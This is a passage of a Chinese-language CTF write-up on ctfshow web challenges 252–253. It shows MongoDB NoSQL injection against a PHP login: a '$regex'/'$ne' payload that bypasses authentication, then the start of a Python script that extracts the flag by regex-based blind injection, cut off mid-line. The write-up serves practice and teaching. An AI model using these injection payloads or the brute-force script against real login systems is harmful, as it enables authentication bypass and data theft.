<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //无过滤</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(count($cursor)&gt;0){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    array_push($ret[&#x27;data&#x27;], $flag);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<p>mongodb的find().pretty()方法的作用。</p>
<p>使得查询出来的数据在命令行中更加美观的显示，不至于太紧凑。</p>
</blockquote>
<p>然后登录测试，发现有admin和admin1，那就用正则来让这俩都爪巴</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">username[$regex]=^[^admin].*$&amp;password[$ne]=1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20220112135118254" src="data:image/png;base64,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" width="323" height="140" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web253">web253<a href="#web253" class="hash-link" aria-label="Direct link to web253" title="Direct link to web253">​</a></h3>
<p>sql语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  db.ctfshow_user.find({username:&#x27;$username&#x27;,password:&#x27;$password&#x27;}).pretty()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //无过滤</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(count($cursor)&gt;0){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    array_push($ret[&#x27;data&#x27;], $flag);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>用上一道的payload，回显是登陆成功但是没flag</p>
<p>于是乎采取盲注的形式，用正则匹配出flag，先用payload1和data1，再用2</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> string</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">table </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> string</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">digits</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">string</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ascii_lowercase</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">string</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ascii_uppercase</span><span class="token operator" style="color:#393A34">+</span><span class="token string" style="color:#e3116c">&#x27;_{}-,&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;http://b4a88d5f-235b-4e06-b7b9-3cf10e9c26de.challenge.ctf.show/api/index.php&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> j </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> table</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        tmp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> flag</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&#x27;f</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">tmp</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">.*$&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data1 </span><span class="token operator" style="color:#393A34">=</span><span 